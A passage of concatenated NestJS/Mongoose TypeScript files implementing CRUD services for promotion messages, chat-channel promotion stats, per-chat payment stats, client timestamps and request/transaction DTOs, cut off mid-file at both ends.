async findOne(): Promise<any>{\n    return this.promoteMsgsService.findOne();\n  }\n\n  @Patch()\n  @ApiOperation({ summary: 'Update promote-msgs' })\n  @ApiBody({type: Object})\n  async update( @Body() updateClientDto: any): Promise<any> {\n    return this.promoteMsgsService.update( updateClientDto);\n  }\n\n}\n","import { Module, Global } from '@nestjs/common';\nimport { MongooseModule } from '@nestjs/mongoose';\nimport { PromoteMsgsService } from './promote-msgs.service';\nimport { PromoteMsgsController } from './promote-msgs.controller';\nimport { PromoteMsgSchema } from './promote-msgs.schema';\n\n@Global()\n@Module({\n  imports: [\n    PromoteMsgModule,\n    MongooseModule.forFeature([{ name: 'promotemsgModule', collection: 'promoteMsgs', schema: PromoteMsgSchema }]),\n  ],\n  providers: [PromoteMsgsService],\n  controllers: [PromoteMsgsController],\n  exports: [PromoteMsgsService],\n})\nexport class PromoteMsgModule { }","import { Schema, SchemaFactory } from '@nestjs/mongoose';\nimport mongoose, { Document } from 'mongoose';\n\nexport type PromoteMsgDocument = PromoteMsg & Document;\n\n@Schema({versionKey: false, autoIndex: true,strict: false ,  timestamps: true,\n    toJSON: {\n      virtuals: true,\n      transform: (doc, ret) => {\n        delete ret._id;\n      },\n    },})\nexport class PromoteMsg {}\n\nexport const PromoteMsgSchema = SchemaFactory.createForClass(PromoteMsg);\nPromoteMsgSchema.add({ type: mongoose.Schema.Types.Mixed });\n\n","import { Injectable, NotFoundException } from '@nestjs/common';\nimport { InjectModel } from '@nestjs/mongoose';\nimport { Model } from 'mongoose';\nimport { PromoteMsg } from './promote-msgs.schema';\n\n@Injectable()\nexport class PromoteMsgsService {\n    constructor(@InjectModel('promotemsgModule') private promotemsgModel: Model<PromoteMsg>) {\n    }\n\n    async OnModuleInit() {\n        console.log(\"Config Module Inited\")\n    }\n\n    async findOne(): Promise<any> {\n        const user = (await this.promotemsgModel.findOne({}, { _id: 0 }).exec())?.toJSON();\n        if (!user) {\n            throw new NotFoundException(`promotemsgModel not found`);\n        }\n        return user;\n    }\n\n    async update(updateClientDto: any): Promise<any> {\n        delete updateClientDto['_id']\n        const updatedUser = await this.promotemsgModel.findOneAndUpdate(\n            {}, // Assuming you want to update the first document found in the collection\n            { $set: { ...updateClientDto } },\n            { new: true, upsert: true }\n        ).exec();\n        if (!updatedUser) {\n            throw new NotFoundException(`promotemsgModel not found`);\n        }\n        return updatedUser;\n    }\n\n}\n","// create-promote-stat.dto.ts\nimport { ApiProperty } from '@nestjs/swagger';\n\nexport class CreatePromoteStatDto {\n  @ApiProperty({ example: 'shruthi1', description: 'Client ID' })\n  client: string;\n\n  @ApiProperty({ example: { \"Girls_Chating_Group_07\": 4, \"girls_friends_chatting_group_01\": 14 }, description: 'Data' })\n  data: Map<string, number>;\n\n  @ApiProperty({ example: 552, description: 'Total Count' })\n  totalCount: number;\n\n  @ApiProperty({ example: 314, description: 'Unique Channels' })\n  uniqueChannels: number;\n\n  @ApiProperty({ example: 1719929752982.0, description: 'Release Day' })\n  releaseDay: number;\n\n  @ApiProperty({ example: 1719860106247.0, description: 'Last Updated TimeStamp' })\n  lastUpdatedTimeStamp: number;\n\n  @ApiProperty({ example: true, description: 'Is Active' })\n  isActive: boolean;\n\n  @ApiProperty({ example: [\"And_Girls_Boys_Group_Chatting\", \"Girls_Chating_Group_07\"], description: 'Channels' })\n  channels: string[];\n}\n","// update-promote-stat.dto.ts\nimport { PartialType } from '@nestjs/swagger';\nimport { CreatePromoteStatDto } from './create-promote-stat.dto';\n\nexport class UpdatePromoteStatDto extends PartialType(CreatePromoteStatDto) {}\n","import { Body, Controller, Delete, Get, Param, Post, Put } from '@nestjs/common';\nimport { ApiTags } from '@nestjs/swagger';\nimport { PromoteStatService } from './promote-stat.service';\nimport { CreatePromoteStatDto } from './dto/create-promote-stat.dto';\nimport { UpdatePromoteStatDto } from './dto/update-promote-stat.dto';\n\n@ApiTags('promote-stats')\n@Controller('promote-stats')\nexport class PromoteStatController {\n  constructor(private readonly promoteStatService: PromoteStatService) {}\n\n  @Post()\n  async create(@Body() createPromoteStatDto: CreatePromoteStatDto) {\n    return this.promoteStatService.create(createPromoteStatDto);\n  }\n\n  @Get(':client')\n  async findByClient(@Param('client') client: string) {\n    return this.promoteStatService.findByClient(client);\n  }\n\n  @Put(':client')\n  async update(\n    @Param('client') client: string,\n    @Body() updatePromoteStatDto: UpdatePromoteStatDto,\n  ) {\n    return this.promoteStatService.update(client, updatePromoteStatDto);\n  }\n\n  @Delete(':client')\n  async deleteOne(@Param('client') client: string) {\n    return this.promoteStatService.deleteOne(client);\n  }\n\n  @Delete()\n  async deleteAll() {\n    return this.promoteStatService.deleteAll();\n  }\n}\n","import { initModule } from './../ConfigurationInit/init.module';\nimport { Module } from '@nestjs/common';\nimport { MongooseModule } from '@nestjs/mongoose';\nimport { PromoteStatService } from './promote-stat.service';\nimport { PromoteStatController } from './promote-stat.controller';\nimport { PromoteStat, PromoteStatSchema } from './schemas/promote-stat.schema';\nimport { ClientModule } from '../clients/client.module';\n\n@Module({\n  imports: [initModule,\n    MongooseModule.forFeature([{ name: PromoteStat.name, collection: \"promoteStats\", schema: PromoteStatSchema }]),\n    ClientModule\n  ],\n  controllers: [PromoteStatController],\n  providers: [PromoteStatService],\n  exports: [PromoteStatService]\n})\nexport class PromoteStatModule { }\n","import { Inject, Injectable, NotFoundException, forwardRef } from '@nestjs/common';\nimport { InjectModel } from '@nestjs/mongoose';\nimport { Model } from 'mongoose';\nimport { CreatePromoteStatDto } from './dto/create-promote-stat.dto';\nimport { UpdatePromoteStatDto } from './dto/update-promote-stat.dto';\nimport { PromoteStat, PromoteStatDocument } from './schemas/promote-stat.schema';\nimport { ClientService } from '../clients/client.service';\n\n@Injectable()\nexport class PromoteStatService {\n  constructor(@InjectModel(PromoteStat.name) private promoteStatModel: Model<PromoteStatDocument>,\n    @Inject(forwardRef(() => ClientService))\n    private clientService: ClientService,) { }\n\n  async create(createPromoteStatDto: CreatePromoteStatDto): Promise<PromoteStat> {\n    const createdPromoteStat = new this.promoteStatModel(createPromoteStatDto);\n    return createdPromoteStat.save();\n  }\n\n  async findAll(): Promise<PromoteStat[]> {\n    const promoteStat = await this.promoteStatModel.find().sort({ totalCount: -1 }).exec();\n    return promoteStat;\n  }\n\n\n  async findByClient(client: string): Promise<PromoteStat> {\n    const promoteStat = await this.promoteStatModel.findOne({ client }).exec()\n    if (!promoteStat) {\n      throw new NotFoundException(`PromoteStat not found for client ${client}`);\n    }\n    return promoteStat;\n  }\n\n  async update(client: string, updatePromoteStatDto: UpdatePromoteStatDto): Promise<PromoteStat> {\n    const promoteStat = await this.promoteStatModel.findOneAndUpdate({ client }, updatePromoteStatDto, { new: true }).exec();\n    if (!promoteStat) {\n      throw new NotFoundException(`PromoteStat not found for client ${client}`);\n    }\n    return promoteStat;\n  }\n\n  async deleteOne(client: string): Promise<void> {\n    const result = await this.promoteStatModel.deleteOne({ client }).exec();\n    if (result.deletedCount === 0) {\n      throw new NotFoundException(`PromoteStat not found for client ${client}`);\n    }\n  }\n\n  async deleteAll(): Promise<void> {\n    await this.promoteStatModel.deleteMany({}).exec();\n  }\n\n  async reinitPromoteStats() {\n    const users = await this.findAll()\n    for (const user of users) {\n      await this.promoteStatModel.updateOne({ client: user.client },\n        {\n          $set: {\n            totalCount: 0,\n            uniqueChannels: 0,\n            releaseDay: Date.now(),\n            lastUpdatedTimeStamp: Date.now(),\n            data: {}//Object.fromEntries((await this.promoteStatModel.findOne({ client: user.client })).channels?.map(channel => [channel, 0])),\n          }\n        }\n      );\n    }\n  }\n}\n","import { Prop, Schema, SchemaFactory } from '@nestjs/mongoose';\nimport { ApiProperty } from '@nestjs/swagger';\nimport { Document } from 'mongoose';\n\nexport type PromoteStatDocument = PromoteStat & Document;\n\n@Schema()\nexport class PromoteStat {\n  @ApiProperty({ example: 'shruthi1', description: 'Client ID' })\n  @Prop({ required: true, unique: true })\n  client: string;\n\n  @ApiProperty({ example: { \"Girls_Chating_Group_07\": 4, \"girls_friends_chatting_group_01\": 14 }, description: 'Data' })\n  @Prop({ required: true, type: Map, of: Number })\n  data: Map<string, number>;\n\n  @ApiProperty({ example: 552, description: 'Total Count' })\n  @Prop({ required: true })\n  totalCount: number;\n\n  @ApiProperty({ example: 314, description: 'Unique Channels' })\n  @Prop({ required: true })\n  uniqueChannels: number;\n\n  @ApiProperty({ example: 1719929752982.0, description: 'Release Day' })\n  @Prop({ required: true })\n  releaseDay: number;\n\n  @ApiProperty({ example: true, description: 'Is Active' })\n  @Prop({ required: true })\n  isActive: boolean;\n\n  @ApiProperty({ example: 1719929752982.0, description: 'Last Updated TimeStamp' })\n  @Prop({ required: true })\n  lastUpdatedTimeStamp: number;\n\n  @ApiProperty({ example: [\"And_Girls_Boys_Group_Chatting\", \"Girls_Chating_Group_07\"], description: 'Channels' })\n  @Prop({ required: true, type: [String] })\n  channels: string[];\n}\n\nexport const PromoteStatSchema = SchemaFactory.createForClass(PromoteStat);\n","import { IsOptional, IsEnum, IsObject, IsUrl, IsNumber, Min, Max } from 'class-validator';\r\nimport { ApiProperty, ApiPropertyOptional } from '@nestjs/swagger';\r\nimport { Method } from 'axios';\r\nimport { Transform } from 'class-transformer';\r\n\r\nenum ResponseType {\r\n    JSON = 'json',\r\n    TEXT = 'text',\r\n    STREAM = 'stream',\r\n    BLOB = 'blob',\r\n    DOCUMENT = 'document',\r\n    ARRAYBUFFER = 'arraybuffer'\r\n}\r\n\r\nexport class ExecuteRequestDto {\r\n    @ApiProperty({ description: 'The URL to send the request to' })\r\n    @IsUrl({}, { message: 'Please provide a valid URL' })\r\n    url: string;\r\n\r\n    @ApiPropertyOptional({ enum: ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'HEAD', 'OPTIONS'], default: 'GET' })\r\n    @IsEnum(['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'HEAD', 'OPTIONS'] as const)\r\n    @IsOptional()\r\n    method?: Method;\r\n\r\n    @ApiPropertyOptional({ type: Object, additionalProperties: { type: \"string\" } })\r\n    @IsObject()\r\n    @IsOptional()\r\n    headers?: Record<string, string>;\r\n\r\n    @ApiPropertyOptional({ description: 'Request body data' })\r\n    @IsOptional()\r\n    data?: any;\r\n\r\n    @ApiPropertyOptional({ type: Object, additionalProperties: { type: 'string' } })\r\n    @IsObject()\r\n    @IsOptional()\r\n    params?: Record<string, string>;\r\n\r\n    @ApiPropertyOptional({ enum: ResponseType, default: ResponseType.JSON })\r\n    @IsEnum(ResponseType)\r\n    @IsOptional()\r\n    responseType?: ResponseType;\r\n\r\n    @ApiPropertyOptional({ description: 'Request timeout in milliseconds', default: 30000, minimum: 1000, maximum: 300000 })\r\n    @IsNumber()\r\n    @Min(1000)\r\n    @Max(300000)\r\n    @IsOptional()\r\n    @Transform(({ value }) => parseInt(value))\r\n    timeout?: number;\r\n\r\n    @ApiPropertyOptional({ description: 'Whether to follow redirects', default: true })\r\n    @IsOptional()\r\n    @Transform(({ value }) => value === 'true' || value === true)\r\n    followRedirects?: boolean;\r\n\r\n    @ApiPropertyOptional({ description: 'Maximum number of redirects to follow', default: 5, minimum: 0, maximum: 10 })\r\n    @IsNumber()\r\n    @Min(0)\r\n    @Max(10)\r\n    @IsOptional()\r\n    @Transform(({ value }) => parseInt(value))\r\n    maxRedirects?: number;\r\n}","// create-stat.dto.ts\nimport { ApiProperty } from '@nestjs/swagger';\n\nexport class CreateStatDto {\n  @ApiProperty({ example: '6785668464', description: 'Chat ID' })\n  chatId: string;\n\n  @ApiProperty({ example: 12, description: 'Count' })\n  count: number;\n\n  @ApiProperty({ example: 50, description: 'Pay Amount' })\n  payAmount: number;\n\n  @ApiProperty({ example: true, description: 'Demo Given' })\n  demoGiven: boolean;\n\n  @ApiProperty({ example: true, description: 'Demo Given Today' })\n  demoGivenToday: boolean;\n\n  @ApiProperty({ example: false, description: 'New User' })\n  newUser: boolean;\n\n  @ApiProperty({ example: true, description: 'Paid Reply' })\n  paidReply: boolean;\n\n  @ApiProperty({ example: 'Amaan Khan', description: 'Name' })\n  name: string;\n\n  @ApiProperty({ example: false, description: 'Second Show' })\n  secondShow: boolean;\n\n  @ApiProperty({ example: null, description: 'Did Pay' })\n  didPay: boolean | null;\n\n  @ApiProperty({ example: 'shruthi1', description: 'Client' })\n  client: string;\n\n  @ApiProperty({ example: 'shruthi', description: 'Profile' })\n  profile: string;\n}\n","import { Body, Controller, Delete, Get, Param, Post, Put } from '@nestjs/common';\nimport { ApiTags } from '@nestjs/swagger';\nimport { StatService } from './stat.service';\nimport { CreateStatDto } from './create-stat.dto';\nimport { UpdateStatDto } from './update-stat.dto';\n\n@ApiTags('stats')\n@Controller('stats')\nexport class StatController {\n  constructor(private readonly statService: StatService) {}\n\n  @Post()\n  async create(@Body() createStatDto: CreateStatDto) {\n    return this.statService.create(createStatDto);\n  }\n\n  @Get(':chatId/:profile')\n  async findByChatIdAndProfile(@Param('chatId') chatId: string, @Param('profile') profile: string) {\n    return this.statService.findByChatIdAndProfile(chatId, profile);\n  }\n\n  @Put(':chatId/:profile')\n  async update(\n    @Param('chatId') chatId: string,\n    @Param('profile') profile: string,\n    @Body() updateStatDto: UpdateStatDto,\n  ) {\n    return this.statService.update(chatId, profile, updateStatDto);\n  }\n\n  @Delete(':chatId/:profile')\n  async deleteOne(@Param('chatId') chatId: string, @Param('profile') profile: string) {\n    return this.statService.deleteOne(chatId, profile);\n  }\n\n  @Delete()\n  async deleteAll() {\n    return this.statService.deleteAll();\n  }\n}\n","import { Module } from '@nestjs/common';\nimport { MongooseModule } from '@nestjs/mongoose';\nimport { StatService } from './stat.service';\nimport { StatController } from './stat.controller';\nimport { StatSchema } from './stat.schema';\nimport { initModule } from '../ConfigurationInit/init.module';\n\n@Module({\n    imports: [\n        initModule,\n        MongooseModule.forFeature([{ name: \"StatsModule\", collection: \"stats\", schema: StatSchema }])],\n    controllers: [StatController],\n    providers: [StatService],\n    exports:[StatService]\n})\nexport class StatModule { }\n","import { Prop, Schema, SchemaFactory } from '@nestjs/mongoose';\nimport { ApiProperty } from '@nestjs/swagger';\nimport { Document } from 'mongoose';\n\nexport type StatDocument = Stat & Document;\n\n@Schema()\nexport class Stat {\n  @ApiProperty({ example: '6785668464', description: 'Chat ID' })\n  @Prop({ required: true })\n  chatId: string;\n\n  @ApiProperty({ example: 12, description: 'Count' })\n  @Prop({ required: true })\n  count: number;\n\n  @ApiProperty({ example: 50, description: 'Pay Amount' })\n  @Prop({ required: true })\n  payAmount: number;\n\n  @ApiProperty({ example: true, description: 'Demo Given' })\n  @Prop({ required: true })\n  demoGiven: boolean;\n\n  @ApiProperty({ example: true, description: 'Demo Given Today' })\n  @Prop({ required: true })\n  demoGivenToday: boolean;\n\n  @ApiProperty({ example: false, description: 'New User' })\n  @Prop({ required: true })\n  newUser: boolean;\n\n  @ApiProperty({ example: true, description: 'Paid Reply' })\n  @Prop({ required: true })\n  paidReply: boolean;\n\n  @ApiProperty({ example: 'Amaan Khan', description: 'Name' })\n  @Prop({ required: true })\n  name: string;\n\n  @ApiProperty({ example: false, description: 'Second Show' })\n  @Prop({ required: true })\n  secondShow: boolean;\n\n  @ApiProperty({ example: null, description: 'Did Pay' })\n  @Prop({ required: false })\n  didPay: boolean | null;\n\n  @ApiProperty({ example: 'shruthi1', description: 'Client' })\n  @Prop({ required: true })\n  client: string;\n\n  @ApiProperty({ example: 'shruthi', description: 'Profile' })\n  @Prop({ required: true })\n  profile: string;\n}\n\nexport const StatSchema = SchemaFactory.createForClass(Stat);\nStatSchema.index({ chatId: 1, profile: 1, client: 1 }, { unique: true });\n","import { Injectable, NotFoundException } from '@nestjs/common';\nimport { InjectModel } from '@nestjs/mongoose';\nimport { Model } from 'mongoose';\nimport { CreateStatDto } from './create-stat.dto';\nimport { UpdateStatDto } from './update-stat.dto';\nimport { Stat, StatDocument } from './stat.schema';\n\n@Injectable()\nexport class StatService {\n  constructor(@InjectModel(\"StatsModule\") private statModel: Model<StatDocument>) {}\n\n  async create(createStatDto: CreateStatDto): Promise<Stat> {\n    const createdStat = new this.statModel(createStatDto);\n    return createdStat.save();\n  }\n\n  async findAll(): Promise<Stat[]> {\n    const stats = await this.statModel.find().exec();\n    return stats;\n  }\n\n  async findByChatIdAndProfile(chatId: string, profile: string): Promise<Stat> {\n    const stat = await this.statModel.findOne({ chatId, profile }).exec();\n    if (!stat) {\n      throw new NotFoundException(`Stat not found for chatId ${chatId} and profile ${profile}`);\n    }\n    return stat;\n  }\n\n  async update(chatId: string, profile: string, updateStatDto: UpdateStatDto): Promise<Stat> {\n    const stat = await this.statModel.findOneAndUpdate({ chatId, profile }, updateStatDto, { new: true }).exec();\n    if (!stat) {\n      throw new NotFoundException(`Stat not found for chatId ${chatId} and profile ${profile}`);\n    }\n    return stat;\n  }\n\n  async deleteOne(chatId: string, profile: string): Promise<void> {\n    const result = await this.statModel.deleteOne({ chatId, profile }).exec();\n    if (result.deletedCount === 0) {\n      throw new NotFoundException(`Stat not found for chatId ${chatId} and profile ${profile}`);\n    }\n  }\n\n  async deleteAll(): Promise<void> {\n    await this.statModel.deleteMany({}).exec();\n  }\n}\n","// update-stat.dto.ts\nimport { PartialType } from '@nestjs/swagger';\nimport { CreateStatDto } from './create-stat.dto';\n\nexport class UpdateStatDto extends PartialType(CreateStatDto) {}\n","// create-stat.dto.ts\nimport { ApiProperty } from '@nestjs/swagger';\n\nexport class CreateStatDto {\n  @ApiProperty({ example: '6785668464', description: 'Chat ID' })\n  chatId: string;\n\n  @ApiProperty({ example: 12, description: 'Count' })\n  count: number;\n\n  @ApiProperty({ example: 50, description: 'Pay Amount' })\n  payAmount: number;\n\n  @ApiProperty({ example: true, description: 'Demo Given' })\n  demoGiven: boolean;\n\n  @ApiProperty({ example: true, description: 'Demo Given Today' })\n  demoGivenToday: boolean;\n\n  @ApiProperty({ example: false, description: 'New User' })\n  newUser: boolean;\n\n  @ApiProperty({ example: true, description: 'Paid Reply' })\n  paidReply: boolean;\n\n  @ApiProperty({ example: 'Amaan Khan', description: 'Name' })\n  name: string;\n\n  @ApiProperty({ example: false, description: 'Second Show' })\n  secondShow: boolean;\n\n  @ApiProperty({ example: null, description: 'Did Pay' })\n  didPay: boolean | null;\n\n  @ApiProperty({ example: 'shruthi1', description: 'Client' })\n  client: string;\n\n  @ApiProperty({ example: 'shruthi', description: 'Profile' })\n  profile: string;\n}\n","import { Body, Controller, Delete, Get, Param, Post, Put } from '@nestjs/common';\nimport { ApiTags } from '@nestjs/swagger';\nimport { Stat2Service } from './stat2.service';\nimport { CreateStatDto } from './create-stat2.dto';\nimport { UpdateStatDto } from './update-stat2.dto';\n\n@ApiTags('stats2')\n@Controller('stats2')\nexport class Stat2Controller {\n  constructor(private readonly statService: Stat2Service) {}\n\n  @Post()\n  async create(@Body() createStatDto: CreateStatDto) {\n    return this.statService.create(createStatDto);\n  }\n\n  @Get(':chatId/:profile')\n  async findByChatIdAndProfile(@Param('chatId') chatId: string, @Param('profile') profile: string) {\n    return this.statService.findByChatIdAndProfile(chatId, profile);\n  }\n\n  @Put(':chatId/:profile')\n  async update(\n    @Param('chatId') chatId: string,\n    @Param('profile') profile: string,\n    @Body() updateStatDto: UpdateStatDto,\n  ) {\n    return this.statService.update(chatId, profile, updateStatDto);\n  }\n\n  @Delete(':chatId/:profile')\n  async deleteOne(@Param('chatId') chatId: string, @Param('profile') profile: string) {\n    return this.statService.deleteOne(chatId, profile);\n  }\n\n  @Delete()\n  async deleteAll() {\n    return this.statService.deleteAll();\n  }\n}\n","import { Module } from '@nestjs/common';\nimport { MongooseModule } from '@nestjs/mongoose';\nimport { Stat2Service } from './stat2.service';\nimport { Stat2Controller } from './stat2.controller';\nimport { StatSchema } from './stat2.schema';\nimport { initModule } from '../ConfigurationInit/init.module';\n\n@Module({\n    imports: [\n        initModule,\n        MongooseModule.forFeature([{ name: \"Stats2Module\", collection: \"stats2\", schema: StatSchema }])],\n    controllers: [Stat2Controller],\n    providers: [Stat2Service],\n    exports: [Stat2Service]\n})\nexport class Stat2Module { }\n","import { Prop, Schema, SchemaFactory } from '@nestjs/mongoose';\nimport { ApiProperty } from '@nestjs/swagger';\nimport { Document } from 'mongoose';\n\nexport type Stat2Document = Stat2 & Document;\n\n@Schema()\nexport class Stat2 {\n  @ApiProperty({ example: '6785668464', description: 'Chat ID' })\n  @Prop({ required: true })\n  chatId: string;\n\n  @ApiProperty({ example: 12, description: 'Count' })\n  @Prop({ required: true })\n  count: number;\n\n  @ApiProperty({ example: 50, description: 'Pay Amount' })\n  @Prop({ required: true })\n  payAmount: number;\n\n  @ApiProperty({ example: true, description: 'Demo Given' })\n  @Prop({ required: true })\n  demoGiven: boolean;\n\n  @ApiProperty({ example: true, description: 'Demo Given Today' })\n  @Prop({ required: true })\n  demoGivenToday: boolean;\n\n  @ApiProperty({ example: false, description: 'New User' })\n  @Prop({ required: true })\n  newUser: boolean;\n\n  @ApiProperty({ example: true, description: 'Paid Reply' })\n  @Prop({ required: true })\n  paidReply: boolean;\n\n  @ApiProperty({ example: 'Amaan Khan', description: 'Name' })\n  @Prop({ required: true })\n  name: string;\n\n  @ApiProperty({ example: false, description: 'Second Show' })\n  @Prop({ required: true })\n  secondShow: boolean;\n\n  @ApiProperty({ example: null, description: 'Did Pay' })\n  @Prop({ required: false })\n  didPay: boolean | null;\n\n  @ApiProperty({ example: 'shruthi1', description: 'Client' })\n  @Prop({ required: true })\n  client: string;\n\n  @ApiProperty({ example: 'shruthi', description: 'Profile' })\n  @Prop({ required: true })\n  profile: string;\n}\n\nexport const StatSchema = SchemaFactory.createForClass(Stat2);\nStatSchema.index({ chatId: 1, profile: 1, client: 1 }, { unique: true });\n","import { Injectable, NotFoundException } from '@nestjs/common';\nimport { InjectModel } from '@nestjs/mongoose';\nimport { Model } from 'mongoose';\nimport { CreateStatDto } from './create-stat2.dto';\nimport { UpdateStatDto } from './update-stat2.dto';\nimport { Stat2, Stat2Document } from './stat2.schema';\n\n@Injectable()\nexport class Stat2Service {\n  constructor(@InjectModel(\"Stats2Module\") private statModel: Model<Stat2Document>) {}\n\n  async create(createStatDto: CreateStatDto): Promise<Stat2> {\n    const createdStat = new this.statModel(createStatDto);\n    return createdStat.save();\n  }\n\n  async findByChatIdAndProfile(chatId: string, profile: string): Promise<Stat2> {\n    const stat = await this.statModel.findOne({ chatId, profile }).exec();\n    if (!stat) {\n      throw new NotFoundException(`Stat not found for chatId ${chatId} and profile ${profile}`);\n    }\n    return stat;\n  }\n\n  async update(chatId: string, profile: string, updateStatDto: UpdateStatDto): Promise<Stat2> {\n    const stat = await this.statModel.findOneAndUpdate({ chatId, profile }, updateStatDto, { new: true }).exec();\n    if (!stat) {\n      throw new NotFoundException(`Stat not found for chatId ${chatId} and profile ${profile}`);\n    }\n    return stat;\n  }\n\n  async findAll(): Promise<Stat2[]> {\n    const stats = await this.statModel.find().exec();\n    return stats;\n  }\n\n  async deleteOne(chatId: string, profile: string): Promise<void> {\n    const result = await this.statModel.deleteOne({ chatId, profile }).exec();\n    if (result.deletedCount === 0) {\n      throw new NotFoundException(`Stat not found for chatId ${chatId} and profile ${profile}`);\n    }\n  }\n\n  async deleteAll(): Promise<void> {\n    await this.statModel.deleteMany({}).exec();\n  }\n}\n","// update-stat.dto.ts\nimport { PartialType } from '@nestjs/swagger';\nimport { CreateStatDto } from './create-stat2.dto';\n\nexport class UpdateStatDto extends PartialType(CreateStatDto) {}\n","import { Controller, Get, Body, Patch, Query } from '@nestjs/common';\nimport { ApiTags, ApiOperation, ApiBody, ApiQuery } from '@nestjs/swagger';\nimport { TimestampService } from './timestamp.service';\n\n@ApiTags('Timestamps')\n@Controller('timestamps')\nexport class TimestampController {\n  constructor(private readonly timestampService: TimestampService) {}\n\n  @Get()\n  @ApiOperation({ summary: 'Get timestamp data' })\n  async findOne(): Promise<any> {\n    return this.timestampService.findOne();\n  }\n\n  @Get('stalled')\n  @ApiOperation({ summary: 'Get clients with time differences greater than threshold' })\n  @ApiQuery({ \n    name: 'threshold', \n    type: Number, \n    required: false, \n    description: 'Minimum time difference in minutes (default: 3)' \n  })\n  async getClientsWithTimeDifference(@Query('threshold') thresholdMinutes?: number): Promise<any[]> {\n    // Convert minutes to milliseconds, default to 3 minutes if not provided\n    const threshold = thresholdMinutes ? thresholdMinutes * 60 * 1000 : 3 * 60 * 1000;\n    return this.timestampService.getClientsWithTimeDifference(threshold);\n  }\n\n  @Patch()\n  @ApiOperation({ summary: 'Update timestamp data' })\n  @ApiBody({ type: Object })\n  async update(@Body() updateTimestampDto: any): Promise<any> {\n    return this.timestampService.update(updateTimestampDto);\n  }\n}","import { Module, Global, forwardRef } from '@nestjs/common';\nimport { MongooseModule } from '@nestjs/mongoose';\nimport { TimestampService } from './timestamp.service';\nimport { TimestampController } from './timestamp.controller';\nimport { TimestampSchema } from './timestamps.schema';\nimport { ClientModule } from '../clients/client.module';\n\n@Global()\n@Module({\n  imports: [\n    MongooseModule.forFeature([{ \n      name: 'timestampModule', \n      collection: 'timestamps', \n      schema: TimestampSchema \n    }]),\n    forwardRef(() => ClientModule),\n  ],\n  providers: [TimestampService],\n  controllers: [TimestampController],\n  exports: [TimestampService],\n})\nexport class TimestampModule {}","import { Injectable, NotFoundException, Inject, forwardRef } from '@nestjs/common';\nimport { InjectModel } from '@nestjs/mongoose';\nimport { Model } from 'mongoose';\nimport { Timestamp } from './timestamps.schema';\nimport { ClientService } from '../clients/client.service';\n\n@Injectable()\nexport class TimestampService {\n    constructor(\n        @InjectModel('timestampModule') private timestampModel: Model<Timestamp>,\n        @Inject(forwardRef(() => ClientService))\n        private clientService: ClientService,\n    ) { }\n\n    async findOne(): Promise<any> {\n        const timestamp = await this.timestampModel.findOne({}).lean().exec();\n        if (!timestamp) {\n            throw new NotFoundException(`Timestamp not found`);\n        }\n\n        // Ensure _id is removed from the response\n        if (timestamp._id) {\n            delete timestamp._id;\n        }\n\n        return timestamp;\n    }\n\n    async getTimeDifferences(threshold: number = 3 * 60 * 1000): Promise<any> {\n        const timestamp = await this.timestampModel.findOne({}).lean().exec();\n        if (!timestamp) {\n            throw new NotFoundException(`Timestamp not found`);\n        }\n\n        const currentTime = Date.now();\n        const differences = {};\n\n        // Loop through each timestamp entry\n        Object.keys(timestamp).forEach(key => {\n            // Skip the _id field and non-numeric values\n            if (key === '_id' || typeof timestamp[key] !== 'number') {\n                return;\n            }\n\n            const difference = currentTime - timestamp[key];\n\n            // Only include differences that are greater than the threshold\n            if (difference > threshold) {\n                differences[key] = difference;\n            }\n        });\n\n        return differences;\n    }\n\n    async getClientsWithTimeDifference(threshold: number = 3 * 60 * 1000): Promise<any[]> {\n        const differences = await this.getTimeDifferences(threshold);\n        const clientIds = Object.keys(differences);\n\n        if (clientIds.length === 0) {\n            return [];\n        }\n\n        const urls = [];\n        for (const clientId of clientIds) {\n            const clientParams = clientId.split('_');\n            try {\n                const client = await this.clientService.findOne(clientParams[0], false);\n                if (client) {\n                    if (clientParams[1]) {\n                        urls.push(client.promoteRepl);\n                    } else {\n                        urls.push(client.repl);\n                    }\n                }\n            } catch (error) {\n                console.error(`Error fetching client with ID ${clientId}:`, error.message);\n            }\n        }\n\n        return urls;\n    }\n\n    async update(updateTimestampDto: any): Promise<any> {\n        // Ensure _id is removed from the input\n        delete updateTimestampDto['_id'];\n\n        const updatedTimestamp = await this.timestampModel.findOneAndUpdate(\n            {}, // Update the first document found in the collection\n            { $set: { ...updateTimestampDto } },\n            { new: true, upsert: true, lean: true }\n        ).exec();\n\n        if (!updatedTimestamp) {\n            throw new NotFoundException(`Timestamp not found`);\n        }\n\n        // Ensure _id is removed from the response\n        if (updatedTimestamp._id) {\n            delete updatedTimestamp._id;\n        }\n\n        return updatedTimestamp;\n    }\n}","import { Schema, SchemaFactory } from '@nestjs/mongoose';\nimport mongoose, { Document } from 'mongoose';\n\nexport type TimestampDocument = Timestamp & Document;\n\n@Schema({\n  versionKey: false, \n  autoIndex: true, \n  strict: false,  \n  timestamps: true,\n  toJSON: {\n    virtuals: true,\n    transform: (doc, ret) => {\n      delete ret._id;\n    },\n  },\n})\nexport class Timestamp {}\n\nexport const TimestampSchema = SchemaFactory.createForClass(Timestamp);\nTimestampSchema.add({ type: mongoose.Schema.Types.Mixed });","import { ApiProperty, ApiPropertyOptional } from '@nestjs/swagger';\nimport { IsString, IsNumber, IsOptional, IsEnum, MinLength, Min, IsNotEmpty } from 'class-validator';\nimport { Transform } from 'class-transformer';\n\nexport enum TransactionStatus {\n  PENDING = 'pending',\n  COMPLETED = 'completed',\n  FAILED = 'failed',\n  CANCELLED = 'cancelled'\n}\n\nexport class CreateTransactionDto {\n  @ApiProperty({ \n    description: 'Unique transaction ID (UTR)',\n    example: 'TXN123456789',\n    minLength: 8 \n  })\n  @IsString()\n  @IsNotEmpty()\n  @MinLength(8)\n  @Transform(({ value }) => typeof value === 'string' ? value.toLowerCase() : value)\n  transactionId: string;\n\n  @ApiProperty({ \n    description: 'Amount involved in the transaction',\n    example: 100.50,\n    minimum: 0 \n  })\n  @IsNumber()\n  @Min(0)\n  @Transform(({ value }) => parseFloat(value))\n  amount: number;\n\n  @ApiProperty({ \n    description: 'Issue type reported by the user',\n    example: 'payment_failed'\n  })\n  @IsString()\n  @IsNotEmpty()\n  issue: string;\n\n  @ApiProperty({ \n    description: 'Description of issue reported by the user',\n    example: 'Payment failed due to network error'\n  })\n  @IsString()\n  @IsNotEmpty()\n  description: string;\n\n  @ApiPropertyOptional({\n    description: 'Refund method selected by the user',\n    example: 'bank_transfer',\n    required: false\n  })\n  @IsString()\n  @IsOptional()\n  refundMethod?: string;\n\n  @ApiPropertyOptional({ \n    description: 'User 